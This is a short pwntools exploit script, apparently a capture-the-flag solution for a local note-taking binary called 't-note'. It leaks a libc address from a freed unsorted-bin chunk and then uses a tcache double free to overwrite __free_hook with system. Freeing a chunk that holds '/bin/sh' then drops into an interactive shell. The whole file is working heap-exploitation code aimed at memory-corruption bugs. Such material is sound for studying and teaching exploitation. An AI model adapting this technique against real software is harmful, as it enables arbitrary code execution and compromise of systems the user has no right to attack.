from pwn import *

p = process("./t-note", env={"LD_PRELOAD": "./libc.so"})

elf = ELF("t-note")
libc = ELF("libc.so")


def add(size, content):
	p.sendlineafter("> \n", "1")
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", content)

def delete(idx):
	p.sendlineafter("> \n", "3")
	p.sendlineafter(": ", str(idx))

def show(idx):
	p.sendlineafter("> \n", "2")
	p.sendlineafter(": ", str(idx))


add(0x500, "AAAA") # unsorted bin chunk 0
add(0x20, "BBBB")  # prevent top_chunk consolidation chunk 1


delete(0)

show(0)
p.recvline()
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
log.info(f"LIBC {hex(libc.address)}")

add(0x40, "CCCC") 
add(0x40, "DDDD") 

delete(2)
delete(2)

add(0x40, p64(libc.symbols['__free_hook']))
add(0x40, "/bin/sh\x00")
add(0x40, p64(libc.symbols['system']))


delete(0)

p.interactive()